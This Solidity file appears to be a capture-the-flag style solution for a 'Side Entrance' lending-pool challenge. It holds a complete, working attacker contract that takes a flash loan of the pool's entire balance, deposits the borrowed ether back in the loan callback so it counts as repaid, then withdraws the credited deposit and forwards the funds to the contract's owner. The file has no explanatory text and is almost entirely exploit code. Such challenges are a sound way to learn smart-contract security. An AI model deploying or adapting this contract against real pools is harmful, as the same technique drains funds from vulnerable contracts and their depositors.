// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntranceAttacker {
    address private immutable pool;
    address private immutable owner;

    constructor(address pool_) {
        pool = pool_;
        owner = msg.sender;
    }

    function exploit() external {
        flashLoan();
        withdrawFromPool();
    }

    function execute() external payable {
        pool.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
    }

    function withdrawFromPool() internal {
        pool.call(abi.encodeWithSignature("withdraw()"));
    }

    function flashLoan() internal {
        uint256 poolBalance = address(pool).balance;
        pool.call(abi.encodeWithSignature("flashLoan(uint256)", poolBalance));
    }

    fallback() external payable {
        payable(owner).transfer(msg.value);
    }
}
